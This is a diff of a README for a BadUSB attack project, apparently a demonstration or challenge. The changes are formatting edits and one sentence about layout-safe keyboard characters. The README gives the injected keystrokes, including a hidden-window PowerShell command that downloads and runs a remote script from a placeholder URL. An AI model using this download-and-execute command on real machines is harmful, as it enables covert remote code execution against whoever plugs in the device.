@@ -25,16 +25,16 @@ cd PublicDuckyChallenger
     srcset="assets/SimpleAttackFlow.png"
     media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)"
   />
-  <img src="assets/SimpleAttackFlow.png" />
+  <img src="assets/SimpleAttackFlow.png" width=50% />
 </picture>
 
 
 ## Keys pressed by the BadUSB
 
-1. `WIN` + `r` which opens a command prompt
-    ![Windows 10 Run Command](assets/Windows10RunCommand.png)
-2. type `powershell -w h "IEX(iwr('URL'))"` where `URL` is  the url to a powershell script to execute
-3. `ENTER` to run the command
+1. `WIN` + `r` which opens a command prompt \
+    <img src="assets/Windows10RunCommand.png" width=40%>
+3. type `powershell -w h "IEX(iwr('URL'))"` where `URL` is  the url to a powershell script to execute
+4. `ENTER` to run the command
 
 ## Programming & Hardware
 See instructions for  [EvilCrowCable-Pro](https://github.com/joelsernamoreno/EvilCrowCable-Pro) at [/evil_crow_cable](/evil_crow_cable) \
@@ -57,7 +57,7 @@ some keys which are placed at different locations in the different layouts will 
     srcset="assets/Payloads.png"
     media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)"
   />
-  <img src="assets/Payloads.png" />
+  <img src="assets/Payloads.png" width=70% />
 </picture>
 
 ## URL shortener
@@ -73,6 +73,7 @@ Characters considered "safe" for keyboards are:
 asdfghjkl
  xcvbnm
 ```
+as the those characters are in the same place for different (common) keyboard layouts.
 [![img.png](assets/keyboard_layouts.png)](https://www.quora.com/What-are-the-most-common-keyboard-layouts-And-why-is-each-layout-designed-as-such)
 (from [quora](https://www.quora.com/What-are-the-most-common-keyboard-layouts-And-why-is-each-layout-designed-as-such))
 
